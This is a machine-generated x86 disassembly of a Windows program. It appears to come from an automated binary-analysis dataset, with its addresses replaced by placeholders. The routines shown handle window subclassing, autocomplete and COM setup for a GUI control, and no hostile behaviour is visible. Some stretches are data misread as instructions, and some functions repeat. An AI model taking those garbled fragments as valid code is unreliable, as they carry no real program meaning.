xor edx edx
mov eax ebx
call sub_441054
push ebx
push sub_43b83c
call sub_460650
mov [ ebx + 0x278 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43bf14
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
add esp 0xfffffff0
call sub_40348c
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
add [ ebx - 0x5efe4d35 ] cl
lodsb [ esi ]
mov [ 0x2be80043 ] al
or eax [ eax ]
add [ ebx - 0x743c7430 ] cl
or bh bh
xchg ecx eax
or al 0x1
add [ eax ] al
cmp [ eax + 0x2 ] 0x0
outsb
jne r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov [ ebx + 0x28c ] eax
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
jne r-xdata
add al [ eax ]
add [ ecx + 0x408b1058 ] cl
adc al 0x89
or [ edx + eax + 0x1b20000 ] 0xffffffa1
add [ ebx + 0x45 ] ah
add al ch
in eax 0x7c
cld
dec [ ebx + 0x7cb389f0 ]
add al [ eax ]
add [ ecx + 0x46c70c5e ] cl
or [ eax - 0x39ffbc4a ] bl
or [ ecx + 0x2 ] 0xffffffa0
movsb [ edi ] [ esi ]
mov ah 0x43
add [ eax + 0x26c83 ] cl
add [ eax + 0x48db243d ] al
add [ eax ] al
je r-xdata
call sub_4030f8
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43b698
mov [ ebx + 0x289 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x26c ] al
cmp [ rw-data ] 0x0
add [ ecx + r-xdata ] esp
sub_43b39c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_43a6dc
mov ecx esi
xor edx edx
mov eax ebx
call sub_441054
push ebx
push sub_43b83c
call sub_460650
mov [ ebx + 0x278 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43bf14
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov [ ebx + 0x28c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43b698
mov [ ebx + 0x289 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x26c ] al
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40348c
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_43b4c3
add [ ebx + 0x56 ] dl
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403128
lea eax [ esi + 0x27c ]
call sub_40d31c
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov eax [ esi + 0x278 ]
call sub_460664
lea eax [ esi + 0x284 ]
call sub_40d31c
lea eax [ esi + 0x268 ]
call sub_4057b4
call CoUninitialize
mov edx ebx
and dl 0xfc
mov eax esi
call sub_441148
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_43b53c
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcdb
je r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
dec eax
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x292 ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x294 ]
call [ esi + 0x290 ]
pop esi
retn
sub_43b58c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x200
call sub_43a6b0
mov edx ebx
mov eax esi
call sub_44c664
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44c590
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
xor edx edx
mov dl [ esi + 0x289 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_43b604
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x280 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_4575f0
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_457634
mov edx ebx
mov eax [ ebx + 0x280 ]
call sub_420e08
mov eax ebx
call sub_44fadc
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_44a198
mov eax ebx
call sub_44cd78
mov eax [ ebx + 0x280 ]
call sub_4568b4
push eax
push 0x0
push 0x402
mov eax ebx
call sub_44f7d8
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_43b698
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4568b4
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_44a198
sub_43b6c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_441784
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424a6c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_43b70c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_448454
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x280 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43b604
sub_43b73c
push ebx
mov ebx eax
mov eax ebx
call sub_44abbc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43b764
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44ed0c
mov eax ebx
call sub_44fadc
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x270 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x240 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_43b7c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a668
mov eax ebx
call sub_4491d4
test al al
je r-xdata
cmp [ ebx + 0x289 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4607d8
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44968c
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4491e4
sub_43b85c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43bb6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441aec
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] ebx
mov esi ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x274 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x289 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x289 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x1
xor eax eax
push ebp
push sub_43ba73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x284 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_419538
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x240 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x244 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push ebx
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x28a ]
mov eax [ ebp - 0x4 ]
call sub_43bba8
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_4057b4
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_4057b4
push eax
push sub_43bb7c
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_4568b4
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
add eax 0x284
call sub_40d31c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_4490a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x0
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bb76
lea eax [ ebp - 0x8 ]
call sub_4057b4
retn
push 0x0
push 0x0
push 0x407
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SendMessageA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c334
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4057cc
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43bd3c
sub edx 0xffffffec
sub_43bba8
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
xor edi edi
mov al [ esp ]
mov [ ebx + 0x28a ] al
mov eax ebx
call sub_44fadc
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov esi rw-data
jae r-xdata
and edx 0x7f
bt [ ebx + 0x28a ] edx
inc eax
add esi 0x4
cmp al 0x5
jne r-xdata
or edi [ esi ]
mov edx eax
cmp dl 0x7
ja r-xdata
push edi
push 0x0
push 0x40e
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
sub_43bc08
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4502a8
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_43b604
cmp [ edi + 0x280 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_43bc6c
push ebx
mov ebx eax
mov eax ebx
call sub_441cd4
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax ebx
call sub_44cd78
sub_43bcb0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28c ]
call sub_419538
test eax eax
jle r-xdata
mov eax ebx
call sub_44cb74
pop esi
pop ebx
retn
cmp [ ebx + 0x284 ] 0x0
jne r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419300
mov esi eax
mov [ ebx + 0x284 ] esi
mov edx [ ebx + 0x28c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43bd00
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
cmp eax [ esi + 0x270 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_43bd3c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43be39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44fadc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43be40
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
cmp [ ebx + 0x268 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_4057b4
mov ecx eax
mov edx sub_43be44
mov eax [ ebx + 0x268 ]
call sub_40d32c
test al al
je r-xdata
test [ ebx + 0x26c ] 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov al [ r-xdata ]
cmp al [ ebx + 0x26c ]
jne r-xdata
xor eax eax
test [ ebx + 0x26c ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
test [ ebx + 0x26c ] 0x2
je r-xdata
or eax 0x1
test [ ebx + 0x26c ] 0x4
je r-xdata
or eax 0x2
test [ ebx + 0x26c ] 0x8
je r-xdata
or eax 0x4
test [ ebx + 0x26c ] 0x10
je r-xdata
or eax 0x8
test [ ebx + 0x26c ] 0x20
je r-xdata
or eax 0x10
test [ ebx + 0x26c ] 0x40
je r-xdata
or eax 0x20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
or eax 0x40
sub_43be44
ror [ ebx - 0x40 ] 0xea
xchg ecx eax
aaa
rcl [ ecx ] cl
mov ebx 0x97600095
jpo r-xdata
retn
dec esp
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43b09c
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_4191a8
pop esi
pop ebx
retn
sub_43be7c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x14 ]
call sub_43b09c
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_4191a8
pop edi
pop esi
pop ebx
retn
sub_43beac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_43bf0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_419464
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_44fadc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bf11
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_44cd78
sub_43bf14
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov eax edi
mov edx [ eax ]
call [ edx + 0x84 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov ecx esi
mov dl 0x1
call sub_439410
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_43bf70
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d31c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4198c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_43bfac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c0e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403f50
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4393d8
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4393d8
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4393d8
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_4393d8
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c0f0
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_43c0f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403f0c
pop edi
pop esi
pop ebx
retn
sub_43c14c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax [ edi + 0x14 ]
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_4393d8
mov eax [ eax + 0x10 ]
mov edx ebp
call sub_407f38
test eax eax
jne r-xdata
sub_43c1b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_43c1d4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop edi
pop esi
pop ebx
retn
sub_43c1fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_44fadc
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_449520
sub_43c24c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_43c2ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4032d8
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x28c ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_43b0a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c2b3
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_43c2bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x28c ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_43b0a8
pop esi
pop ebx
retn
sub_43c2f0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c334
mov esi eax
mov eax [ ebp + 0xc ]
mov edx esi
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_4057cc
mov eax [ ebx + 0x10 ]
mov [ esi + 0x10 ] eax
xor eax eax
pop esi
pop ebx
pop ebp
retn 0x8
sub edx 0xffffffec
sub_43c334
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_43c37c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xc ]
call sub_4393d8
mov edx [ eax + 0x10 ]
mov eax edi
call sub_403f0c
pop edi
pop esi
pop ebx
retn
sub_43c3a0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43c466
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43c370
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x10 ]
mov eax esi
call sub_43c37c
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404710
mov eax [ ebp - 0x4 ]
call sub_404730
mov edi eax
add edi edi
lea eax [ edi + 0x2 ]
push eax
call CoTaskMemAlloc
mov edx [ ebp + 0x10 ]
mov [ edx + ebx * 4 ] eax
lea edx [ edi + 0x2 ]
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
xor ecx ecx
call sub_402b34
mov eax [ ebp + 0x10 ]
mov eax [ eax + ebx * 4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_406afc
inc ebx
inc [ esi + 0x10 ]
mov ebx 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c46d
lea eax [ ebp - 0xc ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_4045c4
retn
sub_43c48c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_43c370
mov edx [ ebp + 0xc ]
add [ ebx + 0x10 ] edx
cmp eax [ ebx + 0x10 ]
jle r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax 0x1
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_43c4b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43c527
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c52e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
